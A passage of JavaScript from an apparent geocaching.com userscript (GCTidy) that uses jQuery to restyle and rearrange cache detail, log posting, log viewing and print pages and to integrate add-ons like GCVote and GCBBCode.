					return ownerHiddenTable.find('img[id^="gcvote"]');
				},
				eventType: 'DOMNodeInserted',
				eventTarget: ownerHiddenTable,
				success: function() {
					ownerHiddenTable
						.show()
						.removeAttr('width')
						.removeAttr('cellspacing')
						.css({'float': 'right', 'margin': '-2.3em 0 -0.5em'})
						.find('td:eq(0)').hide();
				},
				once: true
			});
*/
			function onGCVote(gcvote) {
				voting.children('.gctidy-gcvote-widget').remove();
				gcvote
					.addClass('gctidy-gcvote-widget')
					.removeAttr('style')
					.prependTo(voting);
			}
 			GCTidy.checkForScript({
				test: function(event) {
					return ownerHiddenTable.children().children().children('td:eq(2)').children('div[name^="VoteControl"]');
				},
				eventType: 'DOMNodeInserted',
				eventTarget: ownerHiddenTable,
				success: onGCVote
			});
 			GCTidy.checkForScript({
				test: function(event) {
					return titleTable.children().children().children('td:eq(2)').children('div[name^="VoteControl"]');
				},
				eventType: 'DOMNodeInserted',
				eventTarget: titleTable,
				success: onGCVote,
				once: false
			});
		},
		processCoordinates: function() {
			// Coordinates information widget
			$('#ctl00_ContentBody_lblDistFromHome').css('display', 'block').css('margin-top', '8px').next('br').remove();
			
			// Insert "Map it" link
			$("a[href^='http://www.geocaching.com/map/default.aspx?lat']:first").clone().empty()
				.append('<img src="/images/menu/map_it.gif" title="Map this location" />')
				.prependTo($('#ctl00_ContentBody_LatLon').parent('p').parent('td').removeAttr('colspan'))
				.wrap('<div id="gctidy-map-it-link"></div>');
		},
		processTools: function() {
			// Print
			$('#ctl00_ContentBody_lnkDownloads').closest('td').css('padding-top', '0').css('padding-bottom', '0');
			$('#ctl00_ContentBody_uxPrintHeader')
				.next('br').hide()
				.next('small').find('a span').each(function() {
					var span = $(this);
					span.text($.trim(span.text()));
				});
			
			// Personal Cache Note
			var cacheNote = $('#cache_note');
			if (cacheNote.length) {
				var cacheNoteFieldset = cacheNote.parent();
				cacheNoteFieldset.hide();

				function cacheNoteTest() {
					cacheNote.gctidyClick();
					if ($.trim(cacheNoteFieldset.find('textarea').val()) == '') {
						var cacheNoteButton = $('<span>&nbsp;·&nbsp;</span>')
							.insertAfter('#ctl00_ContentBody_lnkPrintDirectionsSimple');
						var cacheNoteButtonLink = $('<a href="#" class="lnk" title="Add a personal cache note"></a>')
							.append('<img width="16" height="16" src="http://www.geocaching.com/images/silk/note.png"> <span>' + cacheNoteFieldset.find('legend').text() + '</span>')
							.appendTo(cacheNoteButton)
							.click(function() {
								cacheNoteButton.hide();
								cacheNoteFieldset.show();
								cacheNote.gctidyClick();
								return false;
							});
					}
					else {
						cacheNoteFieldset.show();
					}
					cacheNoteFieldset.find('button.inplace_cancel').gctidyClick();
				}
				setTimeout(cacheNoteTest, 0);
			}
		},
		processDescription: function() {
			// User supplied content
			$('.UserSuppliedContent:first').next('br').remove();
			$('.UserSuppliedContent:last').attr('id', 'gctidy-long-description');
			
			// Images
			if ($('#ctl00_ContentBody_Images a').length) {
				$('#ctl00_ContentBody_Images').prepend('<strong>Additional Images</strong><br /><br />').parent().prependTo('#Content .yui-g:eq(1)').find('a').next('br').remove();
				$("#ctl00_ContentBody_Images a[rel='lightbox']")
					.attr('rel', 'gctidy-additional-images-group')
					.each(function() {
						$(this).attr('title', $('span', this).text());
					});
			}
			GCTidy.appendScript('text', 
				'jQuery("#ctl00_ContentBody_Images a[rel=\'gctidy-additional-images-group\']").fancybox({titlePosition: "inside", overlayOpacity: 0.8});'
			);
			
			// Hint
			$('#div_hint')
				.removeClass('HalfLeft')
				.prev('p').hide()
				.prev('p').attr('id', 'gctidy-additional-hints-heading');
			$('#dk')
				.hide();
			if (!$.trim($('#div_hint').text())) {
				$('#gctidy-additional-hints-heading, #div_hint').hide();
			}
			var emptyP = $('#dk').next('div').next('p');
			if (emptyP.length && emptyP.html().replace(/\s/g, '') == '&nbsp;<br>') {
				emptyP.hide();
			}

			// Additional Waypoints
			var waypoints = $('#ctl00_ContentBody_Waypoints');
			var waypointsEditable = waypoints.find('td:first').children().length;
			if (!waypointsEditable) {
				waypoints.addClass('gctidy-waypoints-not-editable');
				waypoints.next('p:has(#ctl00_ContentBody_Waypoints_uxHideHiddenCoordinates)').hide();
				setTimeout(function() {
					waypoints.find('tbody tr').show();
					waypoints.find('tbody tr:even').each(function() {
						var tr1 = $(this);
						var tr2 = tr1.next();
						var notes = tr2.find('td:eq(2)');
						if (!$.trim(notes.text())) {
							tr2.hide();
						}
						else {
							tr1.find('td:eq(2)').attr('rowspan', '2');
							notes.attr('colspan', '5');
						}
					});
				}, 0);
			}
			waypoints.find('tbody tr:even').each(function() {
				var tr1 = $(this).addClass('gctidy-even');
				var tr2 = tr1.next().addClass('gctidy-odd');
				
				// Remove disabled links
				var td = tr1.find('td:eq(7)');
				if (td.find('a').length == td.find('a[disabled]').length) {
					td.empty();
				}
			});
			
			// Float find and map links 
			var findAndMapLinks = $('<div id="gctidy-find-and-map-links"></div>').insertBefore($('#ctl00_ContentBody_FindText').parent());
			$('#ctl00_ContentBody_FindText').parent().add($('#ctl00_ContentBody_FindText').parent().next('ul'))
				.appendTo(findAndMapLinks)
				.wrapAll('<div id="gctidy-find-links"></div>');
			$('#ctl00_ContentBody_uxMapLinkHeader').parent().add($('#ctl00_ContentBody_uxMapLinkHeader').parent().next('ul'))
				.appendTo(findAndMapLinks)
				.wrapAll('<div id="gctidy-map-links"></div>');
			
			// GC Comment
			GCTidy.checkForScript({
				test: function() {
					return $('#gccommentarea');
				},
				eventType: 'DOMNodeInserted',
				eventTarget: $('#gctidy-find-and-map-links'),
				success: function(gccomment) {
					gccomment.insertAfter('#gctidy-find-and-map-links');
				},
				once: true
			});
		},
		processSidebar: function() {
			// Small map
			var smallMapSrc = $('#mapPreview').attr('src');
			if (smallMapSrc && smallMapSrc != '../images/ltv_map.png') {
				smallMapSrc = smallMapSrc.replace(/size=210x150/, 'size=300x150&');
				var smallMapLink = $('#lnkSmallMap').hide();
				smallMapLink.unwrap().wrap('<div class="WidgetBody"></div>').parent().wrap('<div class="CacheDetailNavigationWidget Spacing" id="gctidy-small-map"></div>');
				smallMapLink.parent().before('<h3 class="WidgetHeader"><img src="' + GCTidy.IMAGES.mapIcon + '" width="16px" height="16px" /> Map</h3>');
				$('<a id="gctidy-small-map-link" href="#" style="background-image: url(' + smallMapSrc + ');"></a>').insertAfter(smallMapLink);
			}
			
			// Attributes
			var attributes = $('a[href="/about/icons.aspx"]').closest('.CacheDetailNavigationWidget');
			attributes
				.attr('id', 'gctidy-cache-attributes')
				.wrapInner('<div class="WidgetBody"></div>')
				.prepend('<h3 class="WidgetHeader"><img src="/images/stockholm/16x16/info.gif" width="16px" height="16px" /> Attributes</h3>')
				.find('small').children().unwrap();

			// Navigation widgets
			$('.CacheDetailNavigationWidget')
				.find('p:empty').remove().end()
				.find('a').not('a[href]').hide();
		},
		processLogs: function() {
			// Logs
			var findCounts = $('#ctl00_ContentBody_lblFindCounts');
			findCounts.prev('h3').css('margin-top', '3em').css('clear', 'both');
			findCounts.next('p').find('span').removeClass('Warning');
		},
		getCoordsAndAdditionalWaypoints: function() {
			if (!$('#ctl00_ContentBody_lnkConversions').attr('href')) {
				return false;
			}
			function getInfoWindowHtml(waypoint) {
				var html =
					'<p><img src="' + waypoint.typeImage + '">&nbsp;' + waypoint.prefix + '&nbsp;&nbsp;' + waypoint.lookup + 
					'&nbsp;&nbsp;<strong>' + waypoint.name + '</strong><br /><i>' + waypoint.type + '</i></p>' +
					(waypoint.note ? '<p>' + waypoint.note + '</p>' : '');
				return html;
			}
			function coords2latlngdeg(coords) {
				var latlng = {lat:0, lng:0};
				var match = coords.match(/(N|S) ([0-9]+)° ([0-9\.]+) (E|W) ([0-9]+)° ([0-9\.]+)/);
				if (match && match.length == 7) {
					latlng.lat = Math.round((match[1] == 'N' ? 1 : -1) * (Number(match[2]) + Number(match[3]) / 60) * 1000000) / 1000000;
					latlng.lng = Math.round((match[4] == 'E' ? 1 : -1) * (Number(match[5]) + Number(match[6]) / 60) * 1000000) / 1000000;
				}
				return latlng;
			}
			
			var waypoints = [];

			var latlng = $('#ctl00_ContentBody_lnkConversions').attr('href').match('lat=([^&]*)&lon=([^&]*)');
			var waypoint = {
				type: 'Cache',
				typeImage: $('#ctl00_ContentBody_CacheName').parent('h2').parent('td').prev('td').find('img').attr('src').replace('/WptTypes/', '/WptTypes/sm/'),
				coords: $('#ctl00_ContentBody_LatLon').text(),
				name: $('#ctl00_ContentBody_CacheName').text(),
				lat: latlng[1],
				lng: latlng[2]
			};
			waypoint.html = '<p class="gctidy-waypoint-cache-title"><img src="' + waypoint.typeImage + '"> <strong>' + waypoint.name + '</strong></p>';
			waypoints.push(waypoint);
			
			$('#ctl00_ContentBody_Waypoints tr:odd').each(function() {
				var waypoint = {};
				var row = $(this);
				waypoint.coords = row.find('td:eq(6)').text();
				if (waypoint.coords.match('[?]{3}')) {
					return;
				}
				var latlng = coords2latlngdeg(waypoint.coords);
				waypoint.lat = latlng.lat;
				waypoint.lng = latlng.lng;
				waypoint.type = row.find('td:eq(2) img').attr('alt');
				waypoint.typeImage = row.find('td:eq(2) img').attr('src');
				waypoint.prefix = row.find('td:eq(3)').text().replace(/^\s*/, '').replace(/\s*$/, '');
				waypoint.lookup = row.find('td:eq(4)').text().replace(/^\s*/, '').replace(/\s*$/, '');
				waypoint.name = row.find('td:eq(5) a').text().replace(/^\s*/, '').replace(/\s*$/, '');
				row = row.next('tr');
				waypoint.note = row.find('td:eq(2)').html().replace(/[\n\r]/g, '').replace(/^\s*/, '').replace(/\s*$/, '');
				
				if (waypoint.lat == waypoints[0].lat && waypoint.lng == waypoints[0].lng) {
					waypoints[0].html += getInfoWindowHtml(waypoint);
				}
				else {
					waypoint.html = getInfoWindowHtml(waypoint);
					waypoints.push(waypoint);
				}
			});
			return waypoints;
		},
		getAdditionalImages: function() {
			var images = [];
			$('#ctl00_ContentBody_Images > a').each(function() {
				var anchor = $(this);
				var image = {
					anchor: anchor,
					guid: anchor.attr('href').match(/img\.geocaching\.com\/cache\/([^\.]*\.(?:jpg|gif|png))/i)[1],
					title: anchor.find('span').text(),
					rel: anchor.attr('rel'),
					edit: anchor.next('strong').find('a').attr('href')
				};
				var nextbr = image.edit ? anchor.next('strong').next('br') : anchor.next('br');
				if (nextbr.length && nextbr[0].nextSibling && nextbr[0].nextSibling.nodeName == '#text') {
					image.description = nextbr[0].nextSibling.textContent.replace(/\n/g, ' ');
				}
				if (image.title.match(/spoiler/i) || (image.description && image.description.match(/spoiler/i))) {
					image.spoiler = true;
				}
				images.push(image);
			});
			return images;
		},
		getLogImages: function() {
			var images = [];
			$('.LogsTable table').each(function() {
				var table = $(this);
				var log = {
					table: table,
					images: []
				};
				table.find('a').each(function() {
					var anchor = $(this);
					var image = {
						anchor: anchor,
						guid: anchor.attr('href').match(/img\.geocaching\.com\/cache\/log\/([^\.]*\.(?:jpg|gif|png))/i)[1],
						title: anchor.find('span').text(),
						log: anchor.attr('title').match('log.aspx\.\?[^"]*'),
						rel: anchor.attr('rel')
					};
					var description = anchor.attr('title').match('<p class="LogImgDescription">(.+)</p>$');
					if (description) {
						image.description = description[1];
					}
					if (image.title.match(/spoiler/i) || (image.description && image.description.match(/spoiler/i))) {
						image.spoiler = true;
					}
					log.images.push(image);
				});
				images.push(log);
			});
			return images;
		},
		loadLogs: function(options) {
			var all = options.all;
			var dim = options.dim;
			var guid = $('#ctl00_ContentBody_lnkPrintFriendly5Logs').attr('href').match('[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}')[0];
			$('table.LogsTable').css('opacity', dim ? '0.5' : '1');

			function onSuccess(responseText, textStatus) {
				var page = $(responseText);
				
				// Status info
				$('#ctl00_ContentBody_uxStatusInformation').remove();
				page.find('#ctl00_ContentBody_uxStatusInformation')
					.insertAfter('.CacheDetailNavigationWidget:first');
				
				// Inventory
				var inventory = page.find('#ctl00_ContentBody_uxTravelBugList_uxInventoryIcon').parent('h3').parent('div.CacheDetailNavigationWidget');
				inventory
					.find('p:empty').hide().end()
					.find('a').not('a[href]').hide();
				$('#ctl00_ContentBody_uxTravelBugList_uxInventoryIcon').parent('h3').parent('div.CacheDetailNavigationWidget').replaceWith(inventory);
				
				// ... Logged Visits
				if ($('#ctl00_ContentBody_lblFindCounts').prev('h3').length && page.find('#ctl00_ContentBody_lblFindCounts').prev('h3').length) {
					$('#ctl00_ContentBody_lblFindCounts').prev('h3')[0].firstChild.textContent = page.find('#ctl00_ContentBody_lblFindCounts').prev('h3')[0].firstChild.textContent;
				}
				
				// View them all
				var moreLink = page.find('table.LogsTable + p a');
				if (moreLink.length) {
					var moreLinkBottom = $('table.LogsTable + p a');
					if (moreLinkBottom.length) {
						moreLinkBottom[0].previousSibling.textContent = moreLink[0].previousSibling.textContent;
					}
					var moreLinkTop = $('a[href="/about/glossary.aspx#spoiler"]').parent('p').next('p').find('a');
					if (moreLinkTop.length) {
						moreLinkTop[0].previousSibling.textContent = moreLink[0].previousSibling.textContent;
					}
				}
				
				// Find counts
				$('#ctl00_ContentBody_lblFindCounts p:first').replaceWith(page.find('#ctl00_ContentBody_lblFindCounts p:first'));
				
				// Logs
				$('table.LogsTable').replaceWith(page.find('table.LogsTable'));
				
				options.success && options.success(responseText, textStatus);
				GCTidy.dispatchEvent('GCTidyCacheLogsUpdate');
				
				// GC VIP List
				var viewAll = $('#ctl00_ContentBody_lblFindCounts').nextAll('p:has(a[href^="http://www.geocaching.com/seek/cache_details.aspx"])');
				if (viewAll.length == 2) {
					viewAll.filter(':eq(0)').remove();
				}
			}
			function onError(xmlHttpRequest, textStatus) {
				options.error && options.error(xmlHttpRequest, textStatus);
			}
			function onComplete(xmlHttpRequest, textStatus) {
				$('table.LogsTable').css('opacity', '1');
				options.complete && options.complete(xmlHttpRequest, textStatus);
			}
			GCTidy.xmlHttpRequest({
				type: 'GET',
				url: 'http://www.geocaching.com/seek/cache_details.aspx',
				success: onSuccess,
				error: onError,
				complete: onComplete,
				data: {
					guid: guid,
					log: all ? 'y' : ''
				}
			});
		},
		handleGCVipList: function(handler) {
			if ($('#VIP_table').length) {
				handler();
			}
			else {
				$(document).bind('GCVIPListCachePageReady', handler);
			}
		}
	},
	PrintCacheDetailsPage: {
		META: {
			title: 'Print Cache Details'
		},
		STYLE:
			'.TermsWidget {display: none;}' +
			'#cd {margin-top: 1.5em;}' +
			'#Waypoints th {font-weight: bold;}' +
			'#Waypoints td, #Waypoints th {padding: 0 0.5em 0 0; line-height: 1.4;}' +
			'#Waypoints tr:nth-child(odd) td {padding-top: 0.4em; border-top: 1px solid #aaa;}' +
			'#Waypoints tr:nth-child(odd) td:nth-child(7) {white-space: nowrap;}' +
			'#Waypoints tr th:nth-child(1), #Waypoints tr th:nth-child(8) {display: none;}' +
			'#Waypoints tr:nth-child(odd) td:nth-child(1), #Waypoints tr:nth-child(odd) td:nth-child(8) {display: none;}' +
			'#Waypoints tr:nth-child(even) td {padding-bottom: 0.5em; padding-top: 0.25em;}' +
			'#Waypoints tr:nth-child(even) td:nth-child(2) {visibility: hidden;}' +
			'table.Table tr.AlternatingRow td, .AlternatingRow {background-color: transparent;}' +
			'img {vertical-align: baseline;}',
		process: function() {
			$('p:has(#Waypoints_uxShowHiddenCoordinates)').hide();
			setTimeout(function() {
				$('#Waypoints tr').show();
				$('#Waypoints tr:even').each(function() {
					$(this).find('td:eq(2)').attr('colspan', '4').show();
				});
			}, 0);
		}
	},
	CachePostLogPage: {
		META: {
			title: 'Post/Edit Cache Log'
		},
		SETTINGS: [
			{name: 'log_textarea_height', type: 'number', defaultValue: 257}
		],
		STYLE:
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel dl {margin-top: 2em;}' +
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel.gctidy-gcbbcode dl {margin-top: 0;}' +
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel dl dt, #ctl00_ContentBody_LogBookPanel1_EditLogPanel dl dd {padding-bottom: 0.4em;}' +
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel dt.gctidy-comments-label {padding-bottom: 0.55em;}' +
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel p.gctidy-comments-label {margin-bottom: 0.3em;}' +
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel.gctidy-gcbbcode p.gctidy-comments-label {margin-top: 0;}' +
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel .Validation {color: red !important;}' +
			'#ctl00_ContentBody_LogBookPanel1_EditLogPanel small {font-size: 85%;}' +
			'#ctl00_ContentBody_LogBookPanel1_tbLogInfo {-webkit-box-sizing: border-box; -moz-box-sizing: border-box;}' +
			'#ctl00_ContentBody_LogBookPanel1_uxLogTypeRequiredFieldValidator {position: relative; top: 0.4em;}' +
			'#gctidy-log-type-date:after {content: "."; clear: both; display: block; height: 0px; visibility: hidden;}' +
			'#gctidy-log-type-date > div {float: left; margin-top: 2em; margin-right: 1.5em;}' +
			'#gctidy-log-type-date > div:nth-child(2) {margin-right: 0.75em;}' +
			'#gctidy-log-type-date label {display: inline-block; margin-bottom: 0.45em;}' +
			'#litDescrCharCount {margin-top: 0;}' +
			'#divAdvancedOptions {margin-left: 10em; margin-top: -1.25em; padding: 0; background: transparent; border: none;}' +
			'#divAdvancedOptions label {font-weight: normal; font-size: 85%;}' +
			'#divAdvancedOptions .HalfLeft, #divAdvancedOptions .HalfRight {float: none; width: 100%;}' +
			'table.LatLongTable {margin-left: 1em;}' +
			'#ctl00_ContentBody_LogBookPanel1_ValidationSummary2 {margin-top: 1.5em;}' +
			'#ctl00_ContentBody_LogBookPanel1_TBPanel h4 {font-size: 100%; margin-top: 1.75em; padding-bottom: 0;}' +
			'#tblTravelBugs {margin-top: 0.6em;}' +
			'.gctidy-inside-iframe #divAdvancedOptions, .gctidy-gcbbcode #divAdvancedOptions {margin-left: 0;}' +
			'.gctidy-inside-iframe #ctl00_ContentBody_LogBookPanel1_TBPanel h4, .gctidy-gcbbcode #ctl00_ContentBody_LogBookPanel1_TBPanel h4 {margin-top: 1.5em;}' +
			// GCVote
			'dd > #GCVote-logedit {margin-bottom: 2.5em;}' +
			'#GCVote-logedit span:first-child {display: block; float: left; margin-right: 1em;}' +
			'#GCVote-logedit span:first-child > div > div:first-child {line-height: inherit !important;}' +
			'#GCVote-logedit span:first-child > div > div:first-child > img {vertical-align: -1px;}' +
			'#GCVote-logedit span:first-child > div > div:first-child > small {vertical-align: 1px;}' +
			'.gctidy-gcbbcode #GCVote-logedit span:nth-child(2) {display: none;}' +
			'.gctidy-inside-iframe #GCVote-logedit span:nth-child(2) {display: none;}' +
			// GCBBCode
			'table.gctidy-gcbbcode {margin: 0 0 1.5em; border-spacing: 0 !important; border: none !important;}' +
			'table.gctidy-gcbbcode > tr:first-child > td {border: none !important;}' +
			'table.gctidy-gcbbcode > tr:nth-child(2) > td:first-child {padding-right: 1em;}' +
			'table.gctidy-gcbbcode table {border: none !important;}' +
			'table.gctidy-gcbbcode td:nth-child(2) table:nth-child(1) {margin-top: -3px;}' +
			'table.gctidy-gcbbcode td:nth-child(2) table:nth-child(2) {font-size: 95%; line-height: 1.3;}' +
			'table.gctidy-gcbbcode td:nth-child(2) table:nth-child(2) caption {font-weight: bold; margin-top: 0.8em;}' +
			'table.gctidy-gcbbcode td:nth-child(2) table:nth-child(2) input {margin-right: 4px;}' +
			'table.gctidy-gcbbcode td:nth-child(2) table:nth-child(2) a {text-decoration: underline; text-transform: capitalize;}' +
			'#setDefaultButton {margin-left: 0 !important; text-decoration: underline; text-transform: capitalize;}' +
			'#setDefaultButton b {display: none;}' +
			'#calendarTable {border-color: #999 !important; padding: 0.1em 0.3em 0.2em; }' +
			'#calendarTable td {font-size: 90%; padding: 0 0 0em; width: 2.15em;}' +
			'#calendarTable tr:nth-child(2) td {text-align: center; font-size: 80%; padding: 0.3em 0 0.3em;}' +
			'#calendarTable img {vertical-align: baseline;}' +
			'#gctidy-gcbbcode-editor-toolbar {background: url("../images/masters/sprite_table.gif") repeat-x #D7D7D7; border-width: 1px 1px 0; border-style: solid; border-color: #d7d7d7;}' + //-moz-linear-gradient(center top, #fbfbfb, #e6e6e6)
			'#gctidy-gcbbcode-editor-toolbar td:first-child {padding-left: 0.25em;}' +
			'#gctidy-gcbbcode-editor-toolbar img {-webkit-border-radius: 3px; -moz-border-radius: 3px; margin: 0; padding: 3px 3px 5px !important; border: none !important;}' +
			'',
		process: function(doc) {
			this.doc = $(doc);
			
			this.logPanel = this.doc.find('#ctl00_ContentBody_LogBookPanel1_EditLogPanel');
			this.dl = this.logPanel.find('dl:first');
			this.insideIframe = this.doc.find('body').hasClass('gctidy-inside-iframe');
			
			// In reference to ...
			this.dl.find('dt:first, dd:first').hide();
			$('<p class="NoSpacing gctidy-in-reference-to"></p>', this.doc[0])
				.prependTo(this.logPanel)
				.append(this.dl.find('dt:first').clone().contents())
				.append(' ')
				.append(this.dl.find('dd:first').clone().contents());

			// Textarea
			this.doc.find('#ctl00_ContentBody_LogBookPanel1_uxLogInfo').css('width', '100%');
			
			// Remove "Visit another listing"
			this.doc.find('#ctl00_ContentBody_uxVistOtherListingLabel').parent('div').hide();
			
			// Inside iframe
			if (this.insideIframe) {
				this.processLogTypeLogDate();
				
				// Comments
				this.dl.find('dt:last')
					.addClass('gctidy-comments-label')
					.find('br').hide().end()
					.find('small')
						.attr('id', 'gctidy-insert-into-comments')
						.prepend(' (').append(')');
			}
			
			this.processLogOptions();
			this.processTrackables();

			// GCVote
			GCTidy.checkForScript({
				test: $.proxy(function() {
					//return this.doc.find('#ctl00_ContentBody_LogBookPanel1_tbLogInfo').prev('div').not('#gctidy-gcbbcode-editor-toolbar');
					//return this.dl.find('dd:eq(3) > div'); Hähh?
					return this.dl.find('dd:eq(0)').children('div:first');
				}, this),
				once: false,
				eventType: 'DOMNodeInserted',
				eventTarget: this.logPanel,
				success: $.proxy(this.onGCVote, this)
			});
			
			// GCBBCode
			GCTidy.checkForScript({
				test: $.proxy(function() {
					return this.dl.next('table');
				}, this),
				eventType: 'DOMNodeInserted',
				eventTarget: this.logPanel,
				success: $.proxy(this.onGCBBCode, this)
			});
			
			// Vertical resizer 
			// (Timeout for GCBBCode compatibility)
			setTimeout($.proxy(function() {
				var textarea = this.doc.find('#ctl00_ContentBody_LogBookPanel1_uxLogInfo');
				textarea
					.css('height', this.get('log_textarea_height') + 'px')
					.gctidyVerticalResizer({
						minHeight: 200,
						context: this.doc,
						onResizeEnd: $.proxy(function() {
							this.set('log_textarea_height', textarea.height());
						}, this)
					});
			}, this), 0);
		},
		processLogTypeLogDate: function() {
			GCTidy.appendStyle('#ctl00_ContentBody_LogBookPanel1_EditLogPanel dl dt, #ctl00_ContentBody_LogBookPanel1_EditLogPanel dl dd {margin-left: 0; width: auto; float: none;}', this.doc);

			this.dl.find('dt, dd').each(function() {
				var element = $(this);
				var elementHTML = $.trim(element.html());
				if (!elementHTML || elementHTML == '&nbsp;') {
					element.hide();
				}
			});

			// Float log type and date
			var logTypeDate = $('<div id="gctidy-log-type-date"></div>', this.doc[0]).insertBefore(this.dl);
			$('<div></div>', this.doc[0])
				.append(this.dl.find('dt:eq(1)').hide().contents().wrapAll('<label></label>').parent())
				.append('<br>')
				.append(this.dl.find('dd:eq(1)').hide().contents())
				.appendTo(logTypeDate);
			$('<div></div>', this.doc[0])
				.append(this.dl.find('dt:eq(2)').hide().contents().wrapAll('<label></label>').parent())
				.append('<br>')
				.append(this.dl.find('dd:eq(2)').hide().contents())
				.appendTo(logTypeDate);
			this.doc.find('#ctl00_ContentBody_LogBookPanel1_uxDateFormatHint').parent('small')
				.hide()
				.appendTo(this.dl.find('dd:eq(2)'));
			
			var requiredField = this.doc.find('#ctl00_ContentBody_LogBookPanel1_uxLogTypeRequiredFieldValidator');
			if (requiredField[0].nextSibling && requiredField[0].nextSibling.nodeName == '#text') {
				requiredField[0].nextSibling.textContent = '';
				requiredField.before('<span style="visibility: hidden;">&nbsp;</span>');
			}
			requiredField.wrap('<div style="text-align: right; padding-right: 0.75em;"></div>');
		},
		processLogOptions: function() {
			var logOptions = this.logPanel.find('#divAdvancedOptions');

			logOptions
				.prev('h4').hide();

			logOptions.nextAll('p').each(function() {
				var p = $(this);
				var pHTML = $.trim(p.html());
				if (pHTML == '' || pHTML == '&nbsp;') {
					p.hide();
				}
			})
		},
		processTrackables: function() {
			var trackables = this.doc.find('#ctl00_ContentBody_LogBookPanel1_TBPanel');
			if (trackables.length) {
				trackables.find('p:first')
					.css({'margin-top': '0.6em', 'font-size': '85%'})
					.appendTo(trackables);
				var trackablesLink = trackables.find('h4 a');
				trackablesLink
					.hide()
					.after(trackablesLink.text());
			}
		},
		onGCBBCode: function(gcbbcode) {
			gcbbcode.addClass('gctidy-gcbbcode');
			this.logPanel.addClass('gctidy-gcbbcode');
			if (!this.insideIframe) {
				this.processLogTypeLogDate();
			}
			// Comments
			gcbbcode
				.before('<p class="gctidy-comments-label"><strong>Comments: </strong><small id="gctidy-insert-into-comments" style="display: none;"></small></p>');
			// Toolbar
			gcbbcode.find('tr:first table')
				.insertBefore(this.doc.find('#ctl00_ContentBody_LogBookPanel1_uxLogInfo'))
				.wrap('<div id="gctidy-gcbbcode-editor-toolbar"></div>');
			// Donate-Button
			gcbbcode.find('tr:first form')
				.prependTo(gcbbcode.children('tr:eq(1)').children('td:eq(1)'));
			// Log button
			this.doc.find('#ctl00_ContentBody_LogBookPanel1_LogButton')
				.appendTo(this.logPanel.find('p:last').show())
				.removeAttr('style');
			// Set as default
			setTimeout($.proxy(function() {
				this.doc.find('#setDefaultButton')
					.prev('br').hide().end()
					.insertAfter(this.doc.find('#gctidy-log-type-date label:first'))
					.wrap('<small></small>').parent()
					.prepend(' (').append(')');
			}, this), 0);
			// Trackables
			this.doc.find('#tblTravelBugs')
				.insertAfter(this.doc.find('#ctl00_ContentBody_LogBookPanel1_TBPanel h4'));
		},
		onGCVote: function(gcvote) {
			gcvote
				.addClass('gctidy-gcvote')
				.attr('style', '');
			if (this.insideIframe || this.doc.find('.gctidy-gcbbcode').length) {
				gcvote.appendTo(this.doc.find('#gctidy-log-type-date'));
				setTimeout($.proxy(function() {
					var insertIntoComments = this.doc.find('#gctidy-insert-into-comments');
					if (!insertIntoComments.find('#gctidy-insert-gcvote-info').length && this.doc.find('#GCVote-logedit input').length) {
						if (insertIntoComments.find('a').length) {
							insertIntoComments.find('a').after(' | <a id="gctidy-insert-gcvote-info" href="#"></a>');
						}
						else {
							insertIntoComments.append('(<a id="gctidy-insert-gcvote-info" href="#"></a>)');
						}
						insertIntoComments
							.show()
							.find('#gctidy-insert-gcvote-info')
								.text(this.doc.find('#GCVote-logedit input').val())
								.click($.proxy(function() {
									var event = this.doc[0].createEvent("Event");
									event.initEvent("click", false, false);
									this.doc.find('#GCVote-logedit input')[0].dispatchEvent(event);
									return false;
								}, this));
					}
				}, this), 0);
			}
			else {
				gcvote.prependTo(this.dl.find('dd:last'));
			}
		}
	},
	CacheViewLogPage: {
		//META: {
		//	title: 'View Cache Log'
		//},
		STYLE:
			'#ctl00_ContentBody_LogBookPanel1_ViewLogPanel {margin-bottom: 1.5em;}' +
			'#ctl00_ContentBody_LogBookPanel1_ImagePanel > div {margin-top: 2em; border: 1px solid #ABB7C9; background-color: #eff4f9;}' +
			'#ctl00_ContentBody_LogBookPanel1_LostAndFoundImage {top: 2px;}' +
			'#ctl00_ContentBody_LogBookPanel1_GalleryList img {vertical-align: top; margin-bottom: 0.15em;}' +
			//'h3.gctidy {margin-top: 0.3em; margin-bottom: -0em; font-weight: bold; font-size: 111%;}' +
			//'h3.gctidy a {font-weight: bold;}' +
			'h3 {font-size: 111%;}' +
			'h3 img {vertical-align: -0.2em;}' +
			'#GCVote-logedit {float: right; margin-top: 0.65em; margin-bottom: -2em;}' +
			'#GCVote-logedit > span > div > div:nth-child(1) {width: auto; float: left;}' +
			'#GCVote-logedit > span > div > div:nth-child(2) {clear: left; }' +
			'',
		process: function() {
			var h3 = $('h3:first')
				.addClass('gctidy')
				.find('img:first').removeAttr('align').end();

			var locationContainer = $('#ctl00_ContentBody_LogBookPanel1_lbLocation').parent('p').parent('div');
			var dateContainer = $('#ctl00_ContentBody_LogBookPanel1_LogDate').parent('p').parent('div');
			/*
			$('#ctl00_ContentBody_LogBookPanel1_ViewLogPanel').children(':lt(3)').insertAfter(h3);
			
			locationContainer.find('p:first').appendTo(dateContainer).css('color','#777').css('margin-top', '0');
			dateContainer.find('p:first').appendTo(locationContainer).css('color','#777').css('margin-top', '0').prepend('<br>');
			//*/

			// GCVote
			GCTidy.checkForScript({
				test: $.proxy(function() {
					return dateContainer.children('div');
				}, this),
				once: false,
				eventType: 'DOMNodeInserted',
				eventTarget: dateContainer,
				success: function(gcvote) {
					gcvote.insertBefore($('h3:first'));
				}
			});
		}
	},
	CacheMapPage: {
		// Pocket query sample: http://www.geocaching.com/map/default.aspx?guid=caf0ab7b-06e8-4dff-98a3-04899c1fe063
		META: {
			title: 'Cache Map'
		},
		OPTIONS: [
			{name: 'add_osm', title: 'Add Open Street Maps', type: 'bool', defaultValue: true},
			{name: 'alternative_cache_marker', title: 'Alternative cache marker', type: 'bool', defaultValue: true}
		],
		SETTINGS: [
			{name: 'zoomtoaddress_closed', type: 'bool', defaultValue: false},
			{name: 'filter_closed', type: 'bool', defaultValue: false},
			{name: 'fullscreen', type: 'bool', defaultValue: false},
			{name: 'sidebar_width', type: 'number', defaultValue: 306},
			{name: 'sidebar_hidden', type: 'bool', defaultValue: false},
			{name: 'filter', type: 'string', defaultValue: ''},
			{name: 'label', type: 'bool', defaultValue: false},
